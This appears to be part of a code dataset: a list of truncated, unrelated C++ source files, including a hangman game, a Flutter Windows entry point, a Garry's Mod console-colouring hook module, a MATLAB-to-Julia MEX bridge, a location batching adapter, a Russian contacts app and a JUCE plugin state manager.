<< endl;\r\n\t\tcout << \"\\t|       /|\\\\\" << endl;\r\n\t\tcout << \"\\t|        |\" << endl;\r\n\t\tcout << \"\\t|         \\\\\" << endl;\r\n\t\tcout << \"\\t|\" << endl;\r\n\t\tcout << \"\\t|_\" << endl;\r\n\t\tbreak;\r\n\tcase 2:\r\n\t\tcout << \"\\t|--------|\" << endl;\r\n\t\tcout << \"\\t|        0\" << endl;\r\n\t\tcout << \"\\t|       /|\\\\\" << endl;\r\n\t\tcout << \"\\t|        |\" << endl;\r\n\t\tcout << \"\\t|           \" << endl;\r\n\t\tcout << \"\\t|\" << endl;\r\n\t\tcout << \"\\t|_\" << endl;\r\n\t\tbreak;\r\n\tcase 3:\r\n\t\tcout << \"\\t|--------|\" << endl;\r\n\t\tcout << \"\\t|        0\" << endl;\r\n\t\tcout << \"\\t|       /|\\\\\" << endl;\r\n\t\tcout << \"\\t|         \" << endl;\r\n\t\tcout << \"\\t|           \" << endl;\r\n\t\tcout << \"\\t|\" << endl;\r\n\t\tcout << \"\\t|_\" << endl;\r\n\t\tbreak;\r\n\tcase 4:\r\n\t\tcout << \"\\t|--------|\" << endl;\r\n\t\tcout << \"\\t|        0\" << endl;\r\n\t\tcout << \"\\t|        |\\\\\" << endl;\r\n\t\tcout << \"\\t|         \" << endl;\r\n\t\tcout << \"\\t|           \" << endl;\r\n\t\tcout << \"\\t|\" << endl;\r\n\t\tcout << \"\\t|_\" << endl;\r\n\t\tbreak;\r\n\tcase 5:\r\n\t\tcout << \"\\t|--------|\" << endl;\r\n\t\tcout << \"\\t|        0\" << endl;\r\n\t\tcout << \"\\t|        |  \" << endl;\r\n\t\tcout << \"\\t|         \" << endl;\r\n\t\tcout << \"\\t|           \" << endl;\r\n\t\tcout << \"\\t|\" << endl;\r\n\t\tcout << \"\\t|_\" << endl;\r\n\t\tbreak;\r\n\tcase 6:\r\n\t\tcout << \"\\t|--------|\" << endl;\r\n\t\tcout << \"\\t|        0\" << endl;\r\n\t\tcout << \"\\t|           \" << endl;\r\n\t\tcout << \"\\t|         \" << endl;\r\n\t\tcout << \"\\t|           \" << endl;\r\n\t\tcout << \"\\t|\" << endl;\r\n\t\tcout << \"\\t|_\" << endl;\r\n\t\tbreak;\r\n\tcase 7:\r\n\t\tcout << \"\\t|--------|\" << endl;\r\n\t\tcout << \"\\t|         \" << endl;\r\n\t\tcout << \"\\t|           \" << endl;\r\n\t\tcout << \"\\t|         \" << endl;\r\n\t\tcout << \"\\t|           \" << endl;\r\n\t\tcout << \"\\t|\" << endl;\r\n\t\tcout << \"\\t|_\" << endl;\r\n\t\tbreak;\r\n\t}\r\n}\r\n\r\nstring help_letter(string word, string letter){\r\n    string unknown=\"\";\r\n    for (int x = 0; x < word.size(); x++)\r\n\t{\r\n\t\tif (letter.find(word.at(x)) == -1){\r\n             unknown += word[x];\r\n             break;\r\n        }\r\n\t}\r\n    return unknown;\r\n}\r\n\r\nvoid PrintWord(string word, string letter){\r\n\tfor (int x = 0; x < word.size(); x++)\r\n\t{\r\n\t\tif (letter.find(word.at(x)) != -1)\r\n\t\t\tcout << word.at(x) << \" \";\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout << \"_ \";\r\n\t\t\twin = false;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nint main() {\r\n\tint turns = 7, level;\r\n\r\n\tcout << \"choose your level: \\n1)Easy\\n2)Medium\\n3)Hard\\n-->\";\r\n\tcin >> level;\r\n\r\n\t//Validate input\r\n\twhile (level < 1 || level>3) {\r\n\t\tsystem(\"cls\");\r\n\t\tcout << \"You have enered a wrong number, renter your level..\\n\";\r\n\t\tcout << \"choose your level: \\n1)Easy\\n2)Medium\\n3)Hard\\n-->\";\r\n\t\tcin >> level;\r\n\t}\r\n\r\n    string letter, word = RandomWord(level);\r\n\tstring guessesMade = \"\";\r\n\r\n\tsystem(\"cls\"); \r\n\r\n\tbool help = false, cheating = false;\r\n    int number_of_help = word.size()/2;\r\n\t\r\n\twhile (turns > 0)\r\n\t{\r\n\t\twin = true;\r\n\t\tHangman(turns);\r\n\t\tPrintWord(word, guessesMade);\r\n\t\tif (help)\r\n\t\t{\r\n\t\t\twin = false;\r\n\t\t\thelp = false;\r\n\t\t}\r\n\r\n\t\tif (win == true)\r\n\t\t\tbreak;\r\n\t\tcout << \"\\nYou have \" <<number_of_help<<\" helps left\" << endl;\r\n\t\tcout << \"\\nGuesses made so far: \" << guessesMade << endl;\r\n\t\tcout << \"\\nEnter a letter: \";\r\n\t\tcin >> letter;\r\n\r\n\t\tif (letter.size() >= 2)\r\n\t\t{\r\n\t\t\tif (letter == \"help\")\r\n\t\t\t{\r\n                if(number_of_help==0){\r\n                    cout<<\"\\nOOPS! Out of help, try yourself\\n\";\r\n                    continue;\r\n                }\r\n\t\t\t\thelp = true;\r\n\t\t\t\tturns--;\r\n                number_of_help--;\r\n                letter = help_letter(word, guessesMade);\r\n\t\t\t\tcout <<\"help letter is \"<<letter << endl;\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tcheating = true;\r\n                break;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tguessesMade += letter[0];\r\n\r\n\t\tif (word.find(letter) != -1 || help)\r\n\t\t{\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tsystem(\"cls\");\r\n\t\t\tturns--;\r\n\t\t}\r\n\t}\r\n\r\n\tif ((turns == 0) && !cheating) \r\n\t{\r\n\t\tcout << \"\\nYou Lost:(\\nThe word was: \"<<word<<endl;\r\n\t}\r\n\tif ((turns > 0) && !cheating) \r\n\t{\r\n\t\tcout << \"\\nYou won!!\\nThe word was: \"<<",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"day_1\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <GarrysMod/Lua/Interface.h>\n#include <GarrysMod/Lua/LuaInterface.h>\n#include <GarrysMod/Lua/LuaGameCallback.h>\n\n#include <memory>\n#include <dbg.h>\n\n#include <detouring/hook.hpp>\n#include <detouring/classproxy.hpp>\n\n#if defined PLATFORM_WINDOWS\n#include <Windows.h>\n#endif\n\n#if defined ARCHITECTURE_X86\n#include <Color.h>\n#endif\n\nclass LuaGameCallbackProxy : public Detouring::ClassProxy<GarrysMod::Lua::ILuaGameCallback, LuaGameCallbackProxy> {\npublic:\n    LuaGameCallbackProxy(GarrysMod::Lua::ILuaGameCallback* callback) {\n        Initialize(callback);\n        Hook(&GarrysMod::Lua::ILuaGameCallback::Msg, &LuaGameCallbackProxy::Msg);\n        Hook(&GarrysMod::Lua::ILuaGameCallback::MsgColour, &LuaGameCallbackProxy::MsgColour);\n        Hook(&GarrysMod::Lua::ILuaGameCallback::ErrorPrint, &LuaGameCallbackProxy::ErrorPrint);\n        Hook(&GarrysMod::Lua::ILuaGameCallback::LuaError, &LuaGameCallbackProxy::LuaError);\n    }\n\n    ~LuaGameCallbackProxy() {\n        UnHook(&GarrysMod::Lua::ILuaGameCallback::Msg);\n        UnHook(&GarrysMod::Lua::ILuaGameCallback::MsgColour);\n        UnHook(&GarrysMod::Lua::ILuaGameCallback::ErrorPrint);\n        UnHook(&GarrysMod::Lua::ILuaGameCallback::LuaError);\n    }\n\n    virtual void Msg(const char* msg, bool useless) {\n        ::Msg(\"\\x1b[96m%s\\x1b[0m\", msg);\n\n    }\n    virtual void MsgColour(const char* msg, const Color& color) {\n        ::Msg(\"\\033[38;2;%d;%d;%dm%s\", color.r(), color.b(), color.g(), msg);\n    }\n\n    virtual void ErrorPrint(const char* error, bool print) {\n        ::Msg(\"\\x1b[91m%s\\x1b[0m\\n\", error);\n    }\n\n    virtual void LuaError(const GarrysMod::Lua::ILuaGameCallback::CLuaError* error) {\n        ::Msg(\"\\n\\x1b[30m\\x1b[101m[ERROR]\\x1b[0m \\x1b[91m%s\\x1b[0m\\n\", error->message.c_str());\n\n        size_t stackLen = error->stack.size();\n        for (size_t i = 0; i < stackLen; i++) {\n            const auto& entry = error->stack[i];\n            int pos = i + 1;\n            std::string_view func = entry.function;\n            if (func.size() == 0) func = \"unknown\";\n\n            ::Msg(\" \\x1b[90m%*d. \\x1b[0m\", pos, pos);\n            ::Msg(\"\\x1b[31m%s \\x1b[90m- \", func.data());\n            ::Msg(\"\\x1b[93m%s\\x1b[90m:\\x1b[93m%d\\x1b[0m\\n\", entry.source.c_str(), entry.line);\n        }\n        ::Msg(\"\\n\");\n    }\n};\n\nstd::unique_ptr<LuaGameCallbackProxy> g_LuaGameCallbackProxy;\n\nstd::vector<char> FormatString(const char* pMsg, std::va_list args) {\n    std::va_list args_copy;\n    va_copy(args_copy, args);\n\n    std::vector<char> buf(1 + std::vsnprintf(nullptr, 0, pMsg, args));\n    std::vsnprintf(buf.data(), buf.size(), pMsg, args_copy);\n    va_end(args_copy);\n    return buf;\n}\n\n#define FORMAT_STRING(fmt) std::va_list args; va_start(args, fmt); std::vector<char> buf = FormatString(fmt, args); va_end(args);\n\nvoid ColorizedWarning(const tchar* pMsg, ...) {\n    FORMAT_STRING(pMsg);\n    Msg(\"\\x1b[33m%s\\x1b[0m\", buf.data());\n}\nDetouring::Hook g_WarningHook;\n\nvoid ColorizedDevWarning1(const tchar* pMsg, ...) {\n    FORMAT_STRING(pMsg);\n    DevMsg(\"\\x1b[33m%s\\x1b[0m\", buf.data());\n}\nDetouring::Hook g_DevWarning1Hook;\nvoid ColorizedDevWarning2(int level, const tchar* pMsg, ...) {\n    FORMAT_STRING(pMsg);\n    DevMsg(level, \"\\x1b[33m%s\\x1b[0m\", buf.data());\n}\nDetouring::Hook g_DevWarning2Hook;\nvoid HookDevWarning(void (*DevWarning1)(PRINTF_FORMAT_STRING const tchar* pMsg, ...), void (*DevWarning2)(int level, PRINTF_FORMAT_STRING const tchar* pMsg, ...)) {\n    g_DevWarning1Hook.Create(reinterpret_cast<void*>(DevWarning1), reinterpret_cast<void*>(&ColorizedDevWarning1));\n    g_DevWarning1Hook.Enable();\n    g_DevWarning2Hook.Create(reinterpret_cast<void*>(DevWarning2), reinterpret_cast<void*>(&ColorizedDevWarning2));\n    g_DevWarning2Hook.Enable();\n}\n\nvoid ColorizedConColorMsg1(const Color& color, const tchar* pMsg, ...) {\n    FORMAT_STRING(pMsg);\n    ConMsg(\"\\033[38;2;%d;%d;%dm%s\\x1b[0m\", color.r(), color.b(), color.g(), buf.data());\n}\nDetouring::Hook g_ConColorMsg1;\n\nvoid HookConColorMsg1(void (*ConColorMsg)(const Color& color, const tchar* pMsg, ...)) {\n    g_ConColorMsg1.Create(reinterpret_cast<void*>(ConColorMsg), reinterpret_cast<void*>(&ColorizedConColorMsg1));\n    g_ConColorMsg1.Enable();\n\n}\n\n#if defined ARCHITECTURE_X86\nvoid ColorizedConColorMsg2(int level, const Color& color, const tchar* pMsg, ...) {\n    FORMAT_STRING(pMsg);\n    ConMsg(level, \"\\033[38;2;%d;%d;%dm%s\\x1b[0m\", color.r(), color.b(), color.g(), buf.data());\n}\nDetouring::Hook g_ConColorMsg2;\n\nvoid HookConColorMsg2(void (*ConColorMsg)(int level, const Color& color, const tchar* pMsg, ...)) {\n    g_ConColorMsg2.Create(reinterpret_cast<void*>(ConColorMsg), reinterpret_cast<void*>(&ColorizedConColorMsg2));\n    g_ConColorMsg2.Enable();\n}\n\n#endif\n\nvoid CreditMessage() {\n    std::string_view message = \"colorized B)\";\n    static const Color msg[] = {\n        Color(255, 87, 137),\n        Color(255, 95, 191),\n        Color(234, 119, 244),\n        Color(185, 156, 255),\n        Color(134, 182, 255),\n        Color(74, 198, 255),\n      ",
    "#include \"mex.hpp\"\n#include \"mexAdapter.hpp\"\n\n// windows\n#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n\n#include <tuple>\n// stdc++ lib\n#include <string>\n\n// External dependencies\n// using namespace matlab::data;\nusing matlab::mex::ArgumentList;\n#include <julia.h>\n#include <thread>\n#include <condition_variable>\n#include <mutex>\n\n#include <complex>\n\n#include <chrono>\n\nclass MexFunction : public matlab::mex::Function {\nprivate:\n    std::shared_ptr<matlab::engine::MATLABEngine> matlabPtr;\n    ArgumentList* outputs_p;\n    ArgumentList* inputs_p;\n    std::thread juliaworkerthread;\n    \n    std::mutex m;\n    std::condition_variable cv;\n\n    // std::string julia_environment_path;\n\n\npublic:\n    MexFunction() {\n        // Start Julia worker and initialization.\n        juliaworkerthread = std::thread(&MexFunction::juliaworker, this);\n\n        // wait for Julia init to finish.\n        {\n            std::unique_lock<std::mutex> lk(m);\n            cv.wait(lk);\n        }\n\n    }\n\n    virtual ~MexFunction(){\n        \n        matlab::data::ArrayFactory factory;\n\n        matlabPtr->feval(u\"fprintf\", 0, std::vector<matlab::data::Array>\n            ({ factory.createScalar(\"Closing MEX function\")}));\n    }\n\n    void operator()(ArgumentList outputs, ArgumentList inputs) {\n        inputs_p = &inputs;\n        outputs_p = &outputs;\n\n        // Start Julia Worker\n        cv.notify_one();\n\n        {  \n            // Wait until Julia worker finishes\n            std::unique_lock<std::mutex> lk(m);\n            cv.wait(lk);\n        }\n\n    }\n\n    int juliaworker(){\n        {\n            juliaworkerinit();\n            cv.notify_one();\n        }\n\n\n        while(true){\n            {\n                // Wait until Julia worker can start\n                std::unique_lock<std::mutex> lk(m);\n                cv.wait(lk);\n\n                juliaworkerjob();\n\n                lk.unlock();\n\n                // Pass back control to main thread.\n                cv.notify_one();\n            }\n        }\n        \n        return 0;\n    }\n\n    int juliaworkerinit(){\n        matlabPtr = getEngine(); \n\n        jl_init();\n    \n        jl_eval_string(\"import Pkg; Pkg.instantiate()\");\n                \n        return 0;\n    }\n\n    \n\n    std::string convert_to_string(matlab::data::Array marr)\n    {\n        if (marr.getType() == matlab::data::ArrayType::CHAR)\n        {\n            matlab::data::CharArray ca = marr;\n            return matlab::engine::convertUTF16StringToUTF8String(ca.toUTF16());\n        }\n\n        if(marr.getType() == matlab::data::ArrayType::MATLAB_STRING)\n        {\n            matlab::data::StringArray  sa = marr;\n            matlab::data::MATLABString ms = sa[0];\n            matlab::data::String       sv = *ms;\n            return matlab::engine::convertUTF16StringToUTF8String(sv);\n        }\n\n        throw std::invalid_argument(\"Expected a string\");\n    }\n\n    struct BifrostCallStruct {\n        std::string function;\n        std::string package;\n    };\n\n    BifrostCallStruct convert_callstruct(matlab::data::Array marr){\n        BifrostCallStruct callstruct;\n        if (marr.getType() != matlab::data::ArrayType::STRUCT){\n            throw std::invalid_argument(\"Expecting a callstruct on the first argument\");\n        }\n        matlab::data::StructArray sa = marr;\n        matlab::data::Struct      s  = sa[0];\n\n        callstruct.function = convert_to_string(s[\"function\"]);\n        callstruct.package  = convert_to_string(s[\"package\"]);\n        \n        return callstruct;\n    }\n\n    struct JuliaFunctionSignature {\n        jl_module_t* package;\n        jl_function_t* function;\n        std::vector<jl_datatype_t*> arguments;\n    };\n\n    JuliaFunctionSignature get_jl_function_signature(BifrostCallStruct cs){\n        JuliaFunctionSignature jfs;\n\n        jfs.package = (jl_module_t*) jl_eval_string((\"try \\n import \" + cs.package + \" \\n \" + cs.package + \"\\n catch e \\n bt = catch_backtrace() \\n sprint(showerror, e, bt) \\n end\").c_str());\n        if (jl_is_string((jl_value_t*) jfs.package)){\n            throw std::invalid_argument(jl_string_ptr((jl_value_t*) jfs.package));\n        }\n\n        jfs.function = (jl_function_t*) jl_eval_string((\"try \\n \" + cs.package + \".\" + cs.function + \"\\n catch e \\n bt = catch_backtrace() \\n sprint(showerror, e, bt) \\n end\").c_str());\n        if (jl_is_string((jl_value_t*) jfs.function)){\n            throw std::invalid_argument(jl_string_ptr((jl_value_t*) jfs.function));\n        }\n\n        jl_value_t* jlmethods = jl_call1(jl_get_function(jl_main_module, \"methods\"), jfs.function);\n\n        if (1 == jl_unbox_int64(jl_call1(jl_get_function(jl_main_module, \"length\"), jlmethods))){\n            jl_value_t* jlmethod = jl_call2(jl_get_function(jl_main_module, \"getindex\"), jlmethods, jl_box_int64(1));\n            jl_value_t* metsig   = jl_call2(jl_get_function(jl_main_module, \"getproperty\"), jlmethod, (jl_value_t*) jl_symbol(\"sig\"));\n            jl_value_t* mettypes = jl_call2(jl_get_function(jl_main_module, \"getproperty\"), metsig,   (jl_valu",
    "/* Copyright (c) 2017-2020, The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation, nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n *\n */\n#define LOG_NDEBUG 0\n#define LOG_TAG \"LocSvc_BatchingAdapter\"\n\n#include <loc_pla.h>\n#include <log_util.h>\n#include <LocContext.h>\n#include <BatchingAdapter.h>\n\nusing namespace loc_core;\n\nBatchingAdapter::BatchingAdapter() :\n    LocAdapterBase(0,\n                   LocContext::getLocContext(LocContext::mLocationHalName),\n                   false, nullptr, true),\n    mOngoingTripDistance(0),\n    mOngoingTripTBFInterval(0),\n    mTripWithOngoingTBFDropped(false),\n    mTripWithOngoingTripDistanceDropped(false),\n    mBatchingTimeout(0),\n    mBatchingAccuracy(1),\n    mBatchSize(0),\n    mTripBatchSize(0)\n{\n    LOC_LOGD(\"%s]: Constructor\", __func__);\n    readConfigCommand();\n    setConfigCommand();\n\n    // at last step, let us inform adapater base that we are done\n    // with initialization, e.g.: ready to process handleEngineUpEvent\n    doneInit();\n}\n\nvoid\nBatchingAdapter::readConfigCommand()\n{\n    LOC_LOGD(\"%s]: \", __func__);\n\n    struct MsgReadConfig : public LocMsg {\n        BatchingAdapter& mAdapter;\n        inline MsgReadConfig(BatchingAdapter& adapter) :\n            LocMsg(),\n            mAdapter(adapter) {}\n        inline virtual void proc() const {\n            uint32_t batchingTimeout = 0;\n            uint32_t batchingAccuracy = 0;\n            uint32_t batchSize = 0;\n            uint32_t tripBatchSize = 0;\n            static const loc_param_s_type flp_conf_param_table[] =\n            {\n                {\"BATCH_SIZE\", &batchSize, NULL, 'n'},\n                {\"OUTDOOR_TRIP_BATCH_SIZE\", &tripBatchSize, NULL, 'n'},\n                {\"BATCH_SESSION_TIMEOUT\", &batchingTimeout, NULL, 'n'},\n                {\"ACCURACY\", &batchingAccuracy, NULL, 'n'},\n            };\n            UTIL_READ_CONF(LOC_PATH_FLP_CONF, flp_conf_param_table);\n\n            LOC_LOGD(\"%s]: batchSize %u tripBatchSize %u batchingAccuracy %u batchingTimeout %u \",\n                     __func__, batchSize, tripBatchSize, batchingAccuracy, batchingTimeout);\n\n             mAdapter.setBatchSize(batchSize);\n             mAdapter.setTripBatchSize(tripBatchSize);\n             mAdapter.setBatchingTimeout(batchingTimeout);\n             mAdapter.setBatchingAccuracy(batchingAccuracy);\n        }\n    };\n\n    sendMsg(new MsgReadConfig(*this));\n\n}\n\nvoid\nBatchingAdapter::setConfigCommand()\n{\n    LOC_LOGD(\"%s]: \", __func__);\n\n    struct MsgSetConfig : public LocMsg {\n        BatchingAdapter& mAdapter;\n        LocApiBase& mApi;\n        inline MsgSetConfig(BatchingAdapter& adapter,\n                            LocApiBase& api) :\n            LocMsg(),\n            mAdapter(adapter),\n            mApi(api) {}\n        inline virtual void proc() const {\n            mApi.setBatchSize(mAdapter.getBatchSize());\n            mApi.setTripBatchSize(mAdapter.getTripBatchSize());\n        }\n    };\n\n    sendMsg(new MsgSetConfig(*this, *mLocApi));\n}\n\nvoid\nBatchingAdapter::stopClientSessions(LocationAPI* client)\n{\n    LOC_LOGD(\"%s]: client %p\", __func__, client);\n\n    typedef struct pairKeyBatchMode {\n        LocationAPI* client;\n        uint32_t id;\n        BatchingMode batchingMode;\n        inline pairKeyBatchMode(LocationAPI* _client, uint32_t _id, BatchingMode _bMode) :\n            client(_client), id(_id), batchingMode(_bMode) {}\n    } pairKeyBatchMode;\n    std::vector<pairKeyBatchMode> vBatchingClient;\n    for (auto it : mBatchingSessions) {\n        if (client == it.first.client) {\n            vBatchingClient.emplac",
    "#include \"pattern.h\"\n#include \"Windows.h\"\n\n#include<String>\n\nusing namespace std;\n\n\nvoid menu() {\n\n    cout << \"             *** \u041c\u0435\u043d\u044e ***\" << endl << endl;\n    cout << \"1. \u0421\u043e\u0437\u0434\u0430\u0442\u044c \u043d\u043e\u0432\u044b\u0439 \u043a\u043e\u043d\u0442\u0430\u043a\u0442;\" << endl;\n    cout << \"2. \u041f\u0440\u043e\u0441\u043c\u043e\u0442\u0440\u0435\u0442\u044c \u0441\u043f\u0438\u0441\u043e\u043a \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u043e\u0432;\" << endl;\n    cout << \"3. \u0412\u044b\u0445\u043e\u0434;\" << endl << endl;\n    cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u043f\u0443\u043d\u043a\u0442 \u043c\u0435\u043d\u044e \u0434\u043b\u044f \u0434\u0430\u043b\u044c\u043d\u0435\u0439\u0448\u0435\u0439 \u0440\u0430\u0431\u043e\u0442\u044b: \" << endl;\n}\n\n\nint main() {\n\n    setlocale(0, \"Russian\");\n    SetConsoleCP(1251);\n    SetConsoleOutputCP(1251);\n\n\n    ContactGroup* allContacts = new ContactGroup(\" ***  \u0412\u0441\u0435 \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u044b  ***\");\n    ContactGroup* groupFamily = new ContactGroup(\"\u0421\u0435\u043c\u044c\u044f\");\n    ContactGroup* groupStudy = new ContactGroup(\"\u0423\u0447\u0435\u0431\u0430\");\n    ContactGroup* groupWork = new ContactGroup(\"\u0420\u0430\u0431\u043e\u0442\u0430\");\n    ContactGroup* groupFriends = new ContactGroup(\"\u0414\u0440\u0443\u0437\u044c\u044f\");\n\n    int num;\n\n    menu();\n\n    cin >> num;\n\n    while (num) {\n\n        switch (num) {\n\n        case 1:\n\n            system(\"cls\");\n            while (true)\n            {\n                system(\"cls\");\n\n                cout << \"                    *** \u041d\u043e\u0432\u044b\u0439 \u043a\u043e\u043d\u0442\u0430\u043a\u0442 ***\" << endl << endl;\n                string name, phone, email;\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u0430: \" << endl;\n                cin >> name;\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0442\u0435\u043b\u0435\u0444\u043e\u043d\u0430: \" << endl;\n                cin >> phone;\n                cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0430\u0434\u0440\u0435\u0441 \u044d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u043e\u0439 \u043f\u043e\u0447\u0442\u044b: \" << endl;\n                cin >> email;\n                Contact* newContact = new Contact(name, phone, email);\n\n                int group;\n                char choise;\n\n                cout << \"\u0412 \u043a\u0430\u043a\u0443\u044e \u0433\u0440\u0443\u043f\u043f\u0443 \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043a\u043e\u043d\u0442\u0430\u043a\u0442? (\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0446\u0438\u0444\u0440\u0443) \" << endl;\n                cout << \"1 - \u0441\u0435\u043c\u044c\u044f,  2- \u0443\u0447\u0435\u0431\u0430, 3 - \u0440\u0430\u0431\u043e\u0442\u0430, 4 - \u0434\u0440\u0443\u0437\u044c\u044f, 5 - \u043d\u0435 \u043e\u0442\u0441\u043e\u0440\u0442\u0438\u0440\u043e\u0432\u044b\u0432\u0430\u0442\u044c\" << endl;\n\n                cin >> group;\n\n                if (group == 1) {\n                    allContacts->addContact(groupFamily);\n                    groupFamily->addContact(newContact);\n                }\n                else if (group == 2) {\n                    allContacts->addContact(groupStudy);\n                    groupStudy->addContact(newContact);\n                }\n                else if (group == 3) {\n                    allContacts->addContact(groupWork);\n                    groupWork->addContact(newContact);\n\n                }\n                else if (group == 4) {\n                    allContacts->addContact(groupFriends);\n                    groupFriends->addContact(newContact);\n\n                }\n                else if (group == 5) {\n                    allContacts->addContact(newContact);\n                }\n                else {\n                    cout << \"ERROR! \u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0432\u044b\u0431\u043e\u0440!\";\n                }\n                while (true)\n                {\n                    cout << \"\u041f\u0440\u043e\u0434\u043e\u043b\u0436\u0438\u0442\u044c \u0432\u0432\u043e\u0434? \u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0434 - \u0435\u0441\u043b\u0438 \u0434\u0430, \u043d - \u0435\u0441\u043b\u0438 \u043d\u0435\u0442\" << endl;\n                    cin >> choise;\n                    if (choise == '\u0434' || choise == '\u043d') break;\n                }\n                if (choise == '\u043d') break;\n            }\n            system(\"cls\");\n            menu();\n            cin >> num;\n\n        case 2:\n\n            system(\"cls\");\n            allContacts->display();\n\n            system(\"pause\");\n            system(\"cls\");\n            menu();\n            cin >> num;\n            break;\n\n        case 3:\n            return 0;\n        }\n\n    }\n}",
    "// Nathan Blair January 2023\n\n#include \"StateManager.h\"\n#include \"../plugin/PluginProcessor.h\"\n#include \"../plugin/ProjectInfo.h\"\n\n\nStateManager::StateManager(PluginProcessor* proc) : \n    PRESETS_DIR(juce::File::getSpecialLocation(juce::File::SpecialLocationType::userMusicDirectory).getChildFile(\n        juce::String(JucePlugin_Manufacturer) + \"_plugins\").getChildFile(JucePlugin_Name).getChildFile(\"presets\")\n    ), \n    PRESET_EXTENSION(\".\" + juce::String(JucePlugin_Name).toLowerCase())\n{\n    //==============================================================================\n    //-> ADD PARAMS/PROPERTIES\n    //==============================================================================\n    std::vector<std::unique_ptr<juce::RangedAudioParameter>> params;\n    property_tree = juce::ValueTree(PROPERTIES_ID);\n\n    for (size_t p_id = 0; p_id < PARAM::TOTAL_NUMBER_PARAMETERS; ++p_id) {\n        if (PARAMETER_AUTOMATABLE[p_id]) {\n            params.push_back(\n                std::make_unique<juce::AudioParameterFloat>(\n                    juce::ParameterID{PARAMETER_NAMES[p_id], ProjectInfo::versionNumber},   // parameter ID\n                    PARAMETER_NICKNAMES[p_id],   // parameter name\n                    PARAMETER_RANGES[p_id],  // range\n                    PARAMETER_DEFAULTS[p_id],// default value\n                    \"\", // parameter label (description?)\n                    juce::AudioProcessorParameter::Category::genericParameter,\n                    [p_id](float value, int maximumStringLength) { // Float to String Precision 2 Digits\n                        auto to_string_size = PARAMETER_TO_STRING_ARRS[p_id].size();\n                        juce::String res;\n                        if (to_string_size > 0 && (unsigned int) value < to_string_size) {\n                            res = PARAMETER_TO_STRING_ARRS[p_id][(unsigned long)(value)];\n                        }\n                        else {\n                            std::stringstream ss;\n                            ss << std::fixed << std::setprecision(2) << value;\n                            res = juce::String(ss.str());\n                        }\n                        return (res + \" \" + PARAMETER_SUFFIXES[p_id]).substring(0, maximumStringLength);\n                    },\n                    [p_id](juce::String text) {\n                        text = text.upToFirstOccurrenceOf(\" \" + PARAMETER_SUFFIXES[p_id], false, true);\n                        auto to_string_size = PARAMETER_TO_STRING_ARRS[p_id].size();\n                        if (to_string_size > 0) {\n                            auto beg = PARAMETER_TO_STRING_ARRS[p_id].begin();\n                            auto end = PARAMETER_TO_STRING_ARRS[p_id].end();\n                            auto it 